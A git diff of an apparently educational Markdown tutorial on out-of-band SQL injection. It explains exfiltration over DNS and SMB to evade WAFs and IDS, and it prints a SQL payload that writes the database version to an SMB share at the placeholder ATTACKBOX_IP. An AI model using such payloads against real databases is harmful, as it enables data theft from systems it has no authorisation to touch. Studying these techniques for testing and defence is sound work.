@@ -3,7 +3,7 @@ Out-of-band (OOB) SQL injection is an attack technique that pentester/red team
 
 One of the key advantages of Out-of-band SQL injection is its stealth and reliability. By using **different communication channels**, attackers can minimise the risk of detection and maintain a persistent connection with the compromised system. For instance, an attacker might inject a **SQL payload that triggers the database server to make a DNS request** to a malicious domain controlled by the attacker. The response can then be used to extract sensitive data without alerting security mechanisms that monitor direct database interactions. This method allows attackers to exploit vulnerabilities even in complex network environments where direct connectivity between the attacker and the target is limited or scrutinised.
 
-## Out-Of-Band usecase
+## Usecase
 In scenarios where direct responses are sanitised or limited by security measures, OOB channels enable attackers to exfiltrate data without immediate feedback from the server. For instance, security mechanisms like **stored procedures**, **output encoding**, and **application-level constraints** can **prevent direct responses**, making traditional SQL injection attacks ineffective. Out-of-band techniques, such as using DNS or HTTP requests, allow data to be sent to an external server controlled by the attacker, circumventing these restrictions.
 
 Additionally, **Intrusion Detection Systems (IDS)** and **Web Application Firewalls (WAFs)** often **monitor and log SQL query responses for suspicious activity**, blocking direct responses from potentially malicious queries. By leveraging OOB channels, attackers can avoid detection by using less scrutinized network protocols like DNS or SMB to transfer data. This is particularly useful in network environments with limited direct connectivity between the attacker and the database server, such as when the server is behind a firewall or in a different network segment.
@@ -102,7 +102,7 @@ It is important to note that the MySQL system variable `secure_file_priv` may 
 
 Attackers typically do not have direct access to check the value of the secure_file_priv variable. As a result, they must rely on hit-and-trial methods to determine if and where they can write files, testing various paths to see if file operations succeed.
 
-### **Preparing the Payload**
+### **Payload**
 To exploit this vulnerability, the attacker crafts a payload to inject into the `visitor_name` parameter. The payload will be designed to execute an additional SQL query that writes the database version information to an external SMB share.
 ```sql
 1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
